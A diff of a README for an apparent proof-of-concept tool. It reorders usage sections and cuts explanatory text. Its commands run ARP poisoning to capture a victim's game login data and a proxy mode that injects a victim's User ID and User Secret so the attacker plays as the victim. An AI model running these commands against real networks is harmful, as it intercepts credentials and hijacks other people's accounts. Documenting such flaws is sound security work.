@@ -29,6 +29,11 @@ sudo apt install dsniff wireshark-common
 
 ## Usage
 
+### Capture authentication data via ARP poisoning - writes captured authentication data to `capture.bin`
+```
+sudo python3 poc.py mitm -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP>
+```
+
 ### Decode a captured FlatBuffers blob
 ```
 python3 poc.py decode <HEX>
@@ -44,16 +49,7 @@ python3 poc.py auth <HEX>
 python3 poc.py patch <HEX> 0xOFFSET=VALUE ...
 ```
 
-### Capture authentication data via ARP poisoning
-```
-sudo python3 poc.py mitm -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP>
-```
-
-Poisons the victim's ARP cache, captures their authentication data on the next login, decodes it, and writes the hex blob to `capture.bin`.
-
 ### Session injection via proxy
 ```
 sudo python3 poc.py proxy -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP> 0x014c=<USER_SECRET> 0x0178=<USER_ID>
 ```
-
-Intercepts the attacker's own authentication flow, patches in a victim's User ID and User Secret at the specified offsets, and forwards the modified data to the game server. The attacker then plays the game as the victim.
